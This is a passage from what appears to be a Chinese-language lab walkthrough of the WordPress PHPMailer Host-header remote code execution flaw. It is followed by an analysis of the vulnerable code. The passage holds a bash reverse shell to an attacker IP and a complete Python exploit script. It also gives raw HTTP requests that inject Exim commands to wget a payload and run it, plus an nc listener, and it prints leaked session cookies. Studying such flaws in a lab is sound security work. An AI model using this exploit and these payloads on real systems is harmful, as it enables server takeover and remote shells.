echo "bash -i>& /dev/tcp/192.168.70.4/20000 0>&1" > pwnscriptum/1.txt
```

![image-20241105174158230](https://image.201068.xyz/assets/11.Wordpress/image-20241105174158230.png)

#### python启动http服务

在攻击机上启动80服务，等待靶机下载反弹shell文件。

```bash
cd /root/pwnscriptum
python3 -m http.server 80
```

![image-20241105174210502](https://image.201068.xyz/assets/11.Wordpress/image-20241105174210502.png)

#### exploit.py

```bash
#!/usr/bin/env python3
import requests
import sys

# wordpress's url
target = 'http://192.168.70.4:6081' if len(sys.argv) < 1 else sys.argv[1]
# Put your command in a website, and use the website's url
# don't contains "http://", must be all lowercase
shell_url = 'http://192.168.70.4/1.txt' if len(sys.argv) < 2 else sys.argv[2]
# an exists user
user = 'admin'

def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command


session = requests.session()
data = {
    'user_login': user,
    'redirect_to': '',
    'wp-submit': 'Get New Password'
}
session.headers = {
    'Host': generate_command('/usr/bin/curl -o/tmp/rce ' + shell_url),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}
session.allow_redirects = False
target += '/wp-login.php?action=lostpassword'
session.post(target, data=data)

session.headers['Host'] = generate_command('/bin/bash /tmp/rce')
session.post(target, data=data)
```

#### 更改host 下载恶意文件

更改抓包工具内请求头参数 host

```bash
aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}192.168.70.4${substr{0}{1}{$spool_directory}}1.txt}} null)
```

> 命令相当于 
>
> /usr/bin/wget --output-document /tmp/shell 192.168.70.4/1.txt

![image-20241105173332368](https://image.201068.xyz/assets/11.Wordpress/image-20241105173332368.png)

```bash
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}192.168.70.4${substr{0}{1}{$spool_directory}}1.txt}} null)
Content-Length: 85
Cache-Control: max-age=0
Origin: http://192.168.70.4:6081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.4:6081/wp-login.php?action=lostpassword
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%2C%22first_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_search_keyword%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_referrer%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxMDc4ZDFjY2I2MDctMDc5Y2MyYWZiOTM0NzY4LTI2MDAxZTUxLTEzMjcxMDQtMTkxMDc4ZDFjY2MxMGE1IiwiJGlkZW50aXR5X2xvZ2luX2lkIjoiOGQ3MDY2NmVkN2FmMjFkZmU0YzE3YWI1NGM2ZTgyZTcifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%7D%2C%22%24device_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7C537b96a73a75409acb793ccd24ea9ec6ec0d9e79e3f8cb951391efc4f2b4ea78; wp-settings-time-1=1730792806
Connection: keep-alive

user_login=admin&redirect_to=&wp-submit=%E8%8E%B7%E5%8F%96%E6%96%B0%E5%AF%86%E7%A0%81
```



#### 收到请求记录

请求效果如下，攻击机可看到一条请求记录

![image-20241105173618687](https://image.201068.xyz/assets/11.Wordpress/image-20241105173618687.png)

![image-20241105173917936](https://image.201068.xyz/assets/11.Wordpress/image-20241105173917936.png)

#### 查看shell文件

进入靶机内查看 `/tmp`下是否存在shell文件，说明成功将shell下载到靶机中。

```bash
docker ps -s
docker exec -it  /bin/bash
```

![image-20241105125438671](https://image.201068.xyz/assets/11.Wordpress/image-20241105125438671.png)

#### nc监听

在攻击机中启动一个nc监听并等待反弹shell

```bash
nc -nvlp 20000
```

![image-20241105174433797](https://image.201068.xyz/assets/11.Wordpress/image-20241105174433797.png)

#### 更改host内容 执行恶意文件

再次使用抓包工具，更改host内容为并重放请求。

```bash
aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell}} null)
```

> 相当于
>
> /bin/bash /tmp/shell

![image-20241105174804254](https://image.201068.xyz/assets/11.Wordpress/image-20241105174804254.png)

```bash
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell}} null)
Content-Length: 85
Cache-Control: max-age=0
Origin: http://192.168.70.4:6081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.4:6081/wp-login.php?action=lostpassword
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%2C%22first_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_search_keyword%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_referrer%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxMDc4ZDFjY2I2MDctMDc5Y2MyYWZiOTM0NzY4LTI2MDAxZTUxLTEzMjcxMDQtMTkxMDc4ZDFjY2MxMGE1IiwiJGlkZW50aXR5X2xvZ2luX2lkIjoiOGQ3MDY2NmVkN2FmMjFkZmU0YzE3YWI1NGM2ZTgyZTcifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%7D%2C%22%24device_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7C537b96a73a75409acb793ccd24ea9ec6ec0d9e79e3f8cb951391efc4f2b4ea78; wp-settings-time-1=1730792806
Connection: keep-alive

user_login=admin&redirect_to=&wp-submit=%E8%8E%B7%E5%8F%96%E6%96%B0%E5%AF%86%E7%A0%81
```



#### 反弹成功

![image-20241105174826666](https://image.201068.xyz/assets/11.Wordpress/image-20241105174826666.png)

#### 拷贝代码

```bash
docker ps -s	#获取容器id
docker cp 09bba935c9dc:/var/www/html /root/wordpress_src_web_1
```

![image-20241105175259035](https://image.201068.xyz/assets/11.Wordpress/image-20241105175259035.png)



#### 代码分析

根据忘记密码页面的url `wp-login.php?action=lostpassword`

定位到`wp-login.php`的`retrieve_password`函数，此函数是对密码的操作函数。

找到`wp_mail`方法

![image-20241105175648779](https://image.201068.xyz/assets/11.Wordpress/image-20241105175648779.png)

```bash
function retrieve_password() {
	global $wpdb, $wp_hasher;

	$errors = new WP_Error();

	if ( empty( $_POST['user_login'] ) ) {
		$errors->add('empty_username', __('<strong>ERROR</strong>: Enter a username or email address.'));
	} elseif ( strpos( $_POST['user_login'], '@' ) ) {
		$user_data = get_user_by( 'email', trim( wp_unslash( $_POST['user_login'] ) ) );
		if ( empty( $user_data ) )
			$errors->add('invalid_email', __('<strong>ERROR</strong>: There is no user registered with that email address.'));
	} else {
		$login = trim($_POST['user_login']);
		$user_data = get_user_by('login', $login);
	}

	/**
	 * Fires before errors are returned from a password reset request.
	 *
	 * @since 2.1.0
	 * @since 4.4.0 Added the `$errors` parameter.
	 *
	 * @param WP_Error $errors A WP_Error object containing any errors generated
	 *                         by using invalid credentials.
	 */
	do_action( 'lostpassword_post', $errors );

	if ( $errors->get_error_code() )
		return $errors;

	if ( !$user_data ) {
		$errors->add('invalidcombo', __('<strong>ERROR</strong>: Invalid username or email.'));
		return $errors;
	}

	// Redefining user_login ensures we return the right case in the email.
	$user_login = $user_data->user_login;
	$user_email = $user_data->user_email;
	$key = get_password_reset_key( $user_data );

	if ( is_wp_error( $key ) ) {
		return $key;
	}

	$message = __('Someone has requested a password reset for the following account:') . "\r\n\r\n";
	$message .= network_home_url( '/' ) . "\r\n\r\n";
	$message .= sprintf(__('Username: %s'), $user_login) . "\r\n\r\n";
	$message .= __('If this was a mistake, just ignore this email and nothing will happen.') . "\r\n\r\n";
	$message .= __('To reset your password, visit the following address:') . "\r\n\r\n";
	$message .= '<' . network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login') . ">\r\n";

	if ( is_multisite() )
		$blogname = $GLOBALS['current_site']->site_name;
	else
		/*
		 * The blogname option is escaped with esc_html on the way into the database
		 * in sanitize_option we want to reverse this for the plain text arena of emails.
		 */
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

	$title = sprintf( __('[%s] Password Reset'), $blogname );

	/**
	 * Filters the subject of the password reset email.
	 *
	 * @since 2.8.0
	 * @since 4.4.0 Added the `$user_login` and `$user_data` parameters.
	 *
	 * @param string  $title      Default email title.
	 * @param string  $user_login The username for the user.
	 * @param WP_User $user_data  WP_User object.
	 */
	$title = apply_filters( 'retrieve_password_title', $title, $user_login, $user_data );

	/**
	 * Filters the message body of the password reset mail.
	 *
	 * @since 2.8.0
	 * @since 4.1.0 Added `$user_login` and `$user_data` parameters.
	 *
	 * @param string  $message    Default mail message.
	 * @param string  $key        The activation key.
	 * @param string  $user_login The username for the user.
	 * @param WP_User $user_data  WP_User object.
	 */
	$message = apply_filters( 'retrieve_password_message', $message, $key, $user_login, $user_data );

	if ( $message && !wp_mail( $user_email, wp_specialchars_decode( $title ), $message ) )
		wp_die( __('The email could not be sent.') . "<br />\n" . __('Possible reason: your host may have disabled the mail() function.') );

	return true;
}
```



根据代码可以看出wordpress基于`$_SERVER['SERVER_NAME']`来构造`$​from_email`发送邮件的域，

前面拼接上`wordpress@`并且这里只是简单的使用`substr`去掉了前面的`www.`，没有任何过滤措施。

![image-20241105125625131](https://image.201068.xyz/assets/11.Wordpress/image-20241105125625131.png)

验证address没问题就赋值给Sender,其中用到了validateAddress方法，跟进方法。

![image-20241105125643737](https://image.201068.xyz/assets/11.Wordpress/image-20241105125643737.png)

进入之后发现`$patternselect`变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case


![image-20241105125657284](https://image.201068.xyz/assets/11.Wordpress/image-20241105125657284.png)


查看注释，发现FILTER_VALIDATE_EMAIL基于php内置的邮箱验证的基础上做的修改。

![image-20241105125742732](https://image.201068.xyz/assets/11.Wordpress/image-20241105125742732.png)

根据php官网，支持这个验证方式允许使用括号或双引号使邮箱地址包含空格，

因此在Hosts字段构造的发件人的邮箱

```bash
target(any -froot@localhost -be ${run{$payload}} null)
```

![image-20241105125806178](https://image.201068.xyz/assets/11.Wordpress/image-20241105125806178.png)


 经过测试。邮箱发送过程如下。

```bash
 $phpmailer
 =>Send()wp-includes/pluggable.php#471
 =>postSend()wp-includes/class-phpmailer.php#1125
 =>mailSend()wp-includes/class-phpmailer.php#1247
 =>mailPassthru()wp-includes/class-phpmailer.php#1368
```

 跟进mailPassthru()方法，由于没有开启安全模式，走的下面代码。

```bash
 $result = @mail($to, $subject, $body, $header, $params);
```

##### PHP对第五个参数的讲解：

`additional_params`参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，

如`sendmail_path` 配置设置所定义的那样。

例如，当使用带有’`-f`’  `sendmail`选项的sendmail时，可以使用它来设置信封发送者地址。

该参数通过`escapeshellcmd()`在内部转义，以防止命令执行。

escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。

出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。

![image-20241105125822802](https://image.201068.xyz/assets/11.Wordpress/image-20241105125822802.png)

![image-20241105125914693](https://image.201068.xyz/assets/11.Wordpress/image-20241105125914693.png)

因此上面提到的payload

```bash
target(any -froot@localhost -be ${run{$payload}} null)

#执行为

sendmail -t -i -f wordpress@target(any -froot@localhost -be ${run{$payload}} null)
```

因此下面

```bash
aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}172.27.29.105${substr{0}{1}{$spool_directory}}1.txt}} null)

#执行为

sendmail -t -i -f wordpress@aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}172.27.29.105${substr{0}{1}{$spool_directory}}1.txt}} null)
```
